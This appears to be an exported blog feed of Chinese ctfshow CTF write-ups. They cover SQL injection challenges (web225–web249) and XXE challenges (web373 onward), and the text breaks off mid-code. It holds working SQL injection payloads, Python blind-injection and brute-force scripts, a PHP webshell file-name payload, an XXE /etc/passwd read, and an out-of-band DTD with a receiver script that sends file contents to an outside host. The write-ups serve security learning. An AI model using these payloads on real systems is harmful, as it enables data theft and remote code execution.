src="https://img-blog.csdnimg.cn/20201128094605310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>重置密码后登录，发现需要上传文件，无论上传啥都不行醉了<br><img src="https://img-blog.csdnimg.cn/20201128094625711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>文件名注入，下载群里的<code>payload.bin</code>，十六进制的意思是<code>&lt;?=``$_GET[1]?``&gt;</code>,csdn有毒中间只有一个反引号，大家知道这是啥吧<br><img src="https://img-blog.csdnimg.cn/20201128094952285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此我们就可以进行rce了<br><img src="https://img-blog.csdnimg.cn/20201128095311344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag<br><img src="https://img-blog.csdnimg.cn/2020112809534842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><h3 id="方法一：handler"><a href="#方法一：handler" class="headerlink" title="方法一：handler"></a>方法一：handler</h3><p>没有过滤show<br><code>username=ctfshow&#39;;show tables;</code><br><img src="https://img-blog.csdnimg.cn/20201128101540309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用handler读取<code>username=ctfshow&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;</code><br><img src="https://img-blog.csdnimg.cn/20201128101754886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="方法二：预处理"><a href="#方法二：预处理" class="headerlink" title="方法二：预处理"></a>方法二：预处理</h2><p>利用concat绕过一切过滤，之后就是替换后面的<code>database()</code>为想要执行的语句即可，别忘了加空格，对于不知道啥是预处理的可以看看我这篇博客，<a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=160652999219721940215459&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&amp;utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&amp;spm=1018.2118.3001.4450">[SQL注入][强网杯 2019]随便注(三种姿势)</a><br><code>username=user1&#39;;PREPARE y4tacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; database()&#39;);EXECUTE y4tacker;</code><br><img src="https://img-blog.csdnimg.cn/20201128102243395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当然<code>concat(char(115,101,108,101,99,116)</code>也可以代替<code>select</code></p><h2 id="web226-web228-web230"><a href="#web226-web228-web230" class="headerlink" title="web226/web228-web230"></a>web226/web228-web230</h2><p>这几道题都是这个套路,除了web227是另一个东西<br>过滤了很多，包括<code>(</code>所以预处理语句我们可以更骚一点，用十六进制替换<br><a href="https://www.sojson.com/hexadecimal.html">来个在线转换地址</a><br><img src="https://img-blog.csdnimg.cn/20201128103038882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>记得最后结果前面加上<code>0x</code><br>因此<code>username=user1&#39;;PREPARE y4tacker from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE y4tacker;</code><br>后面怎么做就不需要多说了吧，常规sql注入语句转16进制即可<br><img src="https://img-blog.csdnimg.cn/20201128103136276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><p>这道题，你就算找遍所有地方基本上都找不到<code>flag</code>表<br>先给出其中一个payload<code>1&#39;;call getFlag();</code>虽然能得到答案但是意义不大<br>这道题考点其实是<code>查看MySQL的存储过程</code><br>看看网上这篇文章<a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a><br>我们去查<code>information_schema.routines</code>表<br><img src="https://img-blog.csdnimg.cn/2020112810425329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>出现了这个自定义的函数，不过下面flag都给了哈哈哈<br><img src="https://img-blog.csdnimg.cn/20201128104330170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="web231-232"><a href="#web231-232" class="headerlink" title="web231-232"></a>web231-232</h2><p><code>password=1&#39;,username=user() where 1=1#&amp;username=1</code><br><img src="https://img-blog.csdnimg.cn/20201128112611810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现成功了<br><img src="https://img-blog.csdnimg.cn/20201128112626734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来只需要改payloa即可<br>查表名<br><code>password=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1</code><br>查列名<br><code>password=1&#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flaga&#39;) where 1=1#&amp;username=1</code><br>得到flag<br><code>password=1&#39;,username=(select flagas from flaga) where 1=1#&amp;username=1</code><br>当然子查询也行<br><code>password=&#39;,username=(select a from (select group_concat(flagas)a from flaga) y4tacker) where 1=1;#&amp;username=1</code></p><h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><p>这道题盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1&amp;limit=10&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查表名</span></span><br><span class="line">        <span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;flag233333&#x27; limit 1,1&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagass233 from flag233333&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;1&#x27; or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.05),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;4&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">0.9</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><p>很遗憾单引号被过滤了，但是巅峰极客刚刚考过，用<code>\</code>实现逃逸<br>原来的语句是<br><code>$sql = &quot;update ctfshow_user set pass = &#39;&#123;$password&#125;&#39; where username = &#39;&#123;$username&#125;&#39;;&quot;;</code><br>但是传入单引号后<br><code>$sql = &quot;update ctfshow_user set pass = &#39;\&#39; where username = &#39;username&#39;;&quot;;</code><br>这样<code>pass</code>里面的内容就是<code>&#39; where username =</code>,接下来<code>username</code>里面的参数就是可以控制的了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 考点:\实现逃逸</span></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># username=,username=(select group_concat(table_name) from information_schema.columns where table_schema=database())-- - &amp;password=\</span></span><br><span class="line"><span class="comment"># username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)-- - &amp;password=\</span></span><br><span class="line"><span class="comment"># username=,username=(select flagass23s3 from flag23a)-- - &amp;password=\</span></span><br></pre></td></tr></table></figure><h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><p>过滤<code>or &#39;</code>因此information表也不能用了<br>考虑其他表<code>sys</code>也没有，参考了这两篇文章<br><a href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a><br><a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())-- - &amp;password=\</span></span><br><span class="line"><span class="comment"># username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)-- - &amp;password=\</span></span><br><span class="line">或者一样的没区别只是如果没过率数字可以这样玩</span><br><span class="line"><span class="comment"># username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a)-- - &amp;password=\</span></span><br></pre></td></tr></table></figure><h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())-- - &amp;password=\</span></span><br><span class="line"><span class="comment"># username=,username=(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)-- - &amp;password=\</span></span><br></pre></td></tr></table></figure><h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># username=3&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));-- A&amp;password=1</span></span><br><span class="line"><span class="comment"># username=3&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;));-- A&amp;password=1</span></span><br><span class="line"><span class="comment"># username=3&#x27;,(select flagass23s3 from flag));-- A&amp;password=1</span></span><br></pre></td></tr></table></figure><h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># username=3&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1</span></span><br><span class="line"><span class="comment"># username=3&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flagb&#x27;)));#&amp;password=1</span></span><br><span class="line"><span class="comment"># username=3&#x27;,(select(flag)from(flagb)));#&amp;password=1</span></span><br></pre></td></tr></table></figure><h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><p><code>//过滤空格 or</code><br>首先查表<br><code>username=1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1</code><br><img src="https://img-blog.csdnimg.cn/20201128122354235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>我直呼算命，群主过滤了基本上所有的东西，根据前面规律字段就是<code>flag</code>，所以只需要爆破出表就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35963b4d-3501-4bf2-b888-668ad24e1bc5.chall.ctf.show&quot;</span></span><br><span class="line">url_insert = url + <span class="string">&quot;/api/insert.php&quot;</span></span><br><span class="line">url_flag = url + <span class="string">&quot;/api/?page=1&amp;limit=1000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 看命函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_str</span>():</span><br><span class="line">    sttr = <span class="string">&#x27;ab&#x27;</span></span><br><span class="line">    str_list = [random.choice(sttr) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">    random_str = <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;1&#x27;,(select(flag)from(flag<span class="subst">&#123;generate_random_str()&#125;</span>)))#&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url_insert, data=data)</span><br><span class="line">    r2 = requests.get(url_flag)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r2.json()[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span>  <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> i[<span class="string">&#x27;pass&#x27;</span>]:</span><br><span class="line">                <span class="built_in">print</span>(i[<span class="string">&#x27;pass&#x27;</span>])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p>猜测应该是后端用的intval校验，存在漏洞，所以传一个数组即可<code>http://a3f32775-dcc0-42e2-acba-537e6fd4be17.chall.ctf.show/api/?id[]=flag</code><br><img src="https://img-blog.csdnimg.cn/20201127165611909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="好文推荐"><a href="#好文推荐" class="headerlink" title="好文推荐"></a>好文推荐</h2><p><a href="https://www.cdxy.me/?p=789">MySQL时间盲注五种延时方法 (PWNHUB 非预期解)</a><br><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<p>什么是XXE？</p><p>XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><p>入门可以看看 <a href="https://www.cnblogs.com/zhaijiahui/p/9147595.html">XXE漏洞学习</a>、<a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p><p>[toc]</p><h1 id="web373"><a href="#web373" class="headerlink" title="web373"></a><a href="https://yq1ng.github.io/2021/09/27/ctfshow-xxe-zhuan-ti/#web373" title="web373"></a>web373</h1><p>php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 允许加载外部实体</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="comment">// 加载xml实体，参数为替代实体、加载外部子集</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="comment">// 把 DOM 节点转换为 SimpleXMLElement 对象</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="comment">// 节点嵌套</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>没什么过滤，直接最简单的 payload 打上去就行，注意：只能用 bp 去打，hackbar 会进行编码将 <code>&lt;?xml version =</code> 识别为键名导致 payload 失效。</p><p>xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="web374"><a href="#web374" class="headerlink" title="web374"></a><a href="https://yq1ng.github.io/2021/09/27/ctfshow-xxe-zhuan-ti/#web374" title="web374"></a>web374</h1><p>和开头文章的实验二一模一样，没有回显：<a href="https://xz.aliyun.com/t/3357#toc-8">https://xz.aliyun.com/t/3357#toc-8</a></p><p>php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span> (<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br></pre></td></tr></table></figure><p>vps 创建 <code>ctfshow.dtd</code></p><p>dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://x/a.php?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>接收脚本还是 xss 哪里改的</p><p>php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后 payload：</p><p>xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x/ctfshow.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><h1 id="web375-376"><a href="#web375-376" class="headerlink" title="web375 | 376"></a><a href="https://yq1ng.github.io/2021/09/27/ctfshow-xxe-zhuan-ti/#web375-376" title="web375 | 376"></a>web375 | 376</h1><p>php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 